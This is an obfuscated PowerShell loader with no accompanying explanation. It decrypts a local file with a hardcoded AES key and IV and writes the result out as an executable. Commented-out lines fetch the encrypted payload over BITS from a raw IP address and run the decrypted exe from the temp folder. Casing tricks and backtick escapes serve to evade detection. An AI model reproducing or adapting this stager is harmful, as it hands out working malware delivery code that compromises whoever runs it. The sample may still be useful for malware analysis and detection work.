.'Set-iTem' 'vAriAble:qLz0so'  ( [tYpe]'SySTEM.io.FilEmode') ;  
&'set-VariABLE' l60Yu3  ( [tYPe]'sYStem.SeCuRiTY.crypTOgRAphY.aeS');  
.'Set-VARiaBle'  BI34  (  [TyPE]'sySTEm.secURITY.CrYpTogrAPHY.CrypTOSTReAmmoDE');
.'Import-Module' 'BitsTransfer'
#.'Start-BitsTransfer' -Source 'http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51' -Destination "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
#${Fs} = &'New-Object' 'IO.FileStream'("$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51",  ( &'chilDIteM'  'VAriablE:QLz0sO').VALue::"oP`eN")
${Fs} = &'New-Object' 'IO.FileStream'("./94974f08-5853-41ab-938a-ae1bd86d8e51",  ( &'chilDIteM'  'VAriablE:QLz0sO').VALue::"oP`eN")
${MS} = .'New-Object' 'System.IO.MemoryStream';
${aes} =   (GI  VARiaBLe:l60Yu3).VAluE::'Create'.Invoke()
${aEs}.KEYsIZE = 128
${KEY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${aES}.KEY = ${KEY}
${Aes}.iV = ${iV}
${cS} = .'New-Object' 'System.Security.Cryptography.CryptoStream'(${mS}, ${aEs}.CreateDecryptor.Invoke(),   (&'GeT-VARIaBLE'  bI34  -VaLue )::"W`RItE");
${fs}.CopyTo.Invoke(${Cs})
${decD} = ${Ms}.ToArray.Invoke()
${CS}.Write.Invoke(${dECD}, 0, ${dECd}.LENgTH);
#${DeCd} | .'Set-Content' -Path "$env:temp\tmp7102591.exe" -Encoding 'Byte'
#& "$env:temp\tmp7102591.exe"
${DeCd} | .'Set-Content' -Path "./tmp7102591.exe" -Encoding 'Byte'
